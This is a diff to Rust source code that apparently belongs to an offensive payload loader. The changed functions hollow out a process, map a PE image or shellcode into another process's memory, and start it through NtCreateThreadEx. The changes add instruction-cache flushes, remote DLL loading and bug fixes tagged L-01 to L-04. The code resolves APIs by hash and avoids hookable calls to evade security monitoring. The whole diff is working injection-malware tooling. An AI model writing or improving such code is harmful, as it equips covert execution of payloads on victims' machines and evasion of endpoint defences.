@@ -191,6 +191,16 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         // Apply per-section memory protections now that the IAT has been written (2.4)
         apply_section_protections(pi.hProcess, remote_base, nt);
 
+        // Flush the instruction cache for the entire mapped image so the CPU sees
+        // the newly written code (L-04 fix).
+        unsafe {
+            winapi::um::processthreadsapi::FlushInstructionCache(
+                pi.hProcess,
+                remote_base as *mut c_void,
+                (*nt).OptionalHeader.SizeOfImage as usize,
+            );
+        }
+
         // Update PEB.ImageBaseAddress
         let mut ctx: CONTEXT = zeroed();
         ctx.ContextFlags = CONTEXT_FULL;
@@ -262,17 +272,24 @@ unsafe fn apply_relocations_remote(
 #[cfg(windows)]
 pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
     use std::ptr::null_mut;
-    use winapi::um::processthreadsapi::OpenProcess;
+    use winapi::um::processthreadsapi::{OpenProcess, FlushInstructionCache};
     use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
     use winapi::um::handleapi::CloseHandle;
     use winapi::um::winnt::{
         IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
-        MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, PROCESS_ALL_ACCESS,
+        MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
+        PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ,
+        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
     };
     use winapi::shared::basetsd::SIZE_T;
 
     unsafe {
-        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+        let hprocess = OpenProcess(
+            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
+                | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
+            0,
+            pid,
+        );
         if hprocess.is_null() {
             return Err(anyhow!(
                 "OpenProcess(pid={}) failed: {}",
@@ -373,7 +390,9 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             // Apply per-section protections after writing (2.4)
             apply_section_protections(hprocess, remote_base, nt);
 
-            // Use NtCreateThreadEx instead of hookable CreateRemoteThread
+            // Flush the instruction cache for the entire mapped image so the
+            // CPU sees the newly-written code (L-04 fix).
+            FlushInstructionCache(hprocess, remote_mem as *mut c_void, image_size);
             let entry = (remote_base + ep_rva) as *mut c_void;
             let mut h_thread: *mut c_void = null_mut();
             let status = nt_create_thread(&mut h_thread, 0x1FFFFF, null_mut(), hprocess, entry, null_mut(), 0, 0, 0, 0, null_mut());
@@ -395,6 +414,9 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             WriteProcessMemory(hprocess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written);
             let mut old_prot = 0u32;
             VirtualProtectEx(hprocess, remote_mem, payload.len(), PAGE_EXECUTE_READ, &mut old_prot);
+            // Flush I-cache before redirecting execution into the newly-written
+            // shellcode (L-04 fix).
+            FlushInstructionCache(hprocess, remote_mem, payload.len());
             let mut h_sc_thread: *mut c_void = null_mut();
             let sc_status = nt_create_thread(&mut h_sc_thread, 0x1FFFFF, null_mut(), hprocess, remote_mem, null_mut(), 0, 0, 0, 0, null_mut());
             if sc_status < 0 || h_sc_thread.is_null() {
@@ -420,8 +442,32 @@ unsafe fn fix_iat_remote(
     payload: &[u8],
     written: &mut winapi::shared::basetsd::SIZE_T,
 ) -> Result<()> {
-    use winapi::um::memoryapi::WriteProcessMemory;
+    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
     use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
+    use winapi::um::handleapi::CloseHandle;
+    use winapi::um::synchapi::WaitForSingleObject;
+    use winapi::um::winbase::INFINITE;
+    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, MEM_RELEASE};
+
+    // Resolve NtCreateThreadEx once for remote DLL loading (L-01/L-02 fix).
+    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).unwrap_or(0);
+    let ntcreate_opt = if ntdll_base != 0 {
+        pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtCreateThreadEx\0"))
+    } else {
+        None
+    };
+    type NtCreateThreadExFn = unsafe extern "system" fn(
+        *mut *mut c_void, u32, *mut c_void, *mut c_void,
+        *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void,
+    ) -> i32;
+
+    // LoadLibraryA address (used as the remote thread start routine).
+    let kernel32_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"KERNEL32.DLL\0")).unwrap_or(0);
+    let load_lib_addr = if kernel32_base != 0 {
+        pe_resolve::get_proc_address_by_hash(kernel32_base, pe_resolve::hash_str(b"LoadLibraryA\0"))
+    } else {
+        None
+    };
 
     let import_dir = &(*nt).OptionalHeader
         .DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
@@ -445,13 +491,45 @@ unsafe fn fix_iat_remote(
         let dll_name_lower = format!("{}\0", dll_name_str.to_ascii_lowercase());
 
         // Find/load the DLL in our process
-        let dll_base = {
-            let hash = pe_resolve::hash_str(dll_name_lower.as_bytes());
-            pe_resolve::get_module_handle_by_hash(hash).unwrap_or_else(|| {
-                let hmod = LoadLibraryA(dll_name_lower.as_ptr() as _);
-                hmod as usize
-            })
+        let hash = pe_resolve::hash_str(dll_name_lower.as_bytes());
+        let local_existing = pe_resolve::get_module_handle_by_hash(hash);
+        let dll_base = if let Some(b) = local_existing {
+            b
+        } else {
+            // DLL was not already in our address space.  Load it into the
+            // *target* process first so that:
+            //   L-02: DLL_PROCESS_ATTACH fires in the target
+            //   L-01: session-wide ASLR ensures both processes map the DLL at
+            //         the same preferred base, so addresses we resolve locally
+            //         remain valid remotely.
+            if let (Some(nt_create_addr), Some(ll_addr)) = (ntcreate_opt, load_lib_addr) {
+                let name_len = dll_name_lower.len(); // includes null terminator
+                let remote_name = VirtualAllocEx(hprocess, std::ptr::null_mut(), name_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                if !remote_name.is_null() {
+                    let mut wr = 0usize;
+                    if WriteProcessMemory(hprocess, remote_name, dll_name_lower.as_ptr() as _, name_len, &mut wr) != 0 {
+                        let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(nt_create_addr);
+                        let mut h_thread: *mut c_void = std::ptr::null_mut();
+                        let status = nt_create_thread(
+                            &mut h_thread, 0x1FFFFF, std::ptr::null_mut(), hprocess,
+                            ll_addr as *mut c_void, remote_name, 0, 0, 0, 0, std::ptr::null_mut(),
+                        );
+                        if status >= 0 && !h_thread.is_null() {
+                            WaitForSingleObject(h_thread, INFINITE);
+                            CloseHandle(h_thread);
+                        } else {
+                            tracing::warn!("fix_iat_remote: NtCreateThreadEx for remote LoadLibraryA failed: {:x}", status);
+                        }
+                    }
+                    winapi::um::memoryapi::VirtualFreeEx(hprocess, remote_name, 0, MEM_RELEASE);
+                }
+            }
+            // Now load locally — the preferred base will be established in the
+            // target already so our function-address lookups match.
+            let hmod = LoadLibraryA(dll_name_lower.as_ptr() as _);
+            hmod as usize
         };
+
         if dll_base == 0 {
             tracing::warn!("fix_iat_remote: could not find/load {}", dll_name_str);
             desc_off += 20;
